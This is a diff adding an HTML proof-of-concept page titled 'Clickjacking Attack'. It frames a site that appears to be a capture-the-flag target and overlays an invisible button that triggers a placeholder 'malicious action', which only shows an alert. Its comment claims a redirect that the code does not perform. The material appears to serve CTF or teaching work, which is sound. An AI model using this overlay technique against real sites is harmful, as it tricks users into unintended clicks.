@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Attack</title>
+    <style>
+        /* Style for the deceptive element */
+        .deceptive-element {
+            position: absolute;
+            top: 150px;
+            left: 360px;
+            opacity: 0;
+            /* Make the element transparent */
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Deceptive webpage content -->
+
+    <iframe src="https://uhctf.be"></iframe>
+
+    <div class="deceptive-element">
+        <!-- Insert your deceptive content here -->
+        <button onclick="performMaliciousAction()">Click Me!</button>
+    </div>
+    <!-- Script to perform malicious action -->
+    <script>
+        function performMaliciousAction() {
+            // This is where you would perform the malicious action
+            // For demonstration purposes, we'll simply redirect the user to a different page
+            alert("You have been hacked!");
+        }
+    </script>
+
+</body>
+
+</html>
